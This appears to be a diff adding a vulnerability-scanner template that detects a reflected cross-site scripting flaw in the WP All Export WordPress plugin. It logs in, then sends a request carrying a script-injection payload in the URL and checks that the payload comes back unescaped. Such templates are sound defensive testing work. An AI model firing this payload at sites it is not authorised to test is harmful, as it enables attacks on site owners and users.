@@ -1,0 +1,46 @@
+id: wp-all-export-xss
+
+info:
+  name: WP All Export < 1.3.6 - Reflected Cross-Site Scripting
+  author: Akincibor
+  severity: medium
+  description: The plugin does not escape some URLs before outputting them back in attributes, leading to Reflected Cross-Site Scripting.
+  metadata:
+    verified: true
+  reference:
+    - https://wpscan.com/vulnerability/de330a59-d64d-40be-86df-98997949e5e4
+  tags: wp-plugin,xss,wp,wordpress,authenticated
+
+requests:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: wordpress_test_cookie=WP%20Cookie%20check
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+
+      - |
+        GET /wp-admin/admin.php?page=pmxe-admin-manage&a"><script>alert(1)</script> HTTP/1.1
+        Host: {{Hostname}}
+
+    cookie-reuse: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'manage&a\"><script>alert(1)</script>">'
+          - 'Manage Exports'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
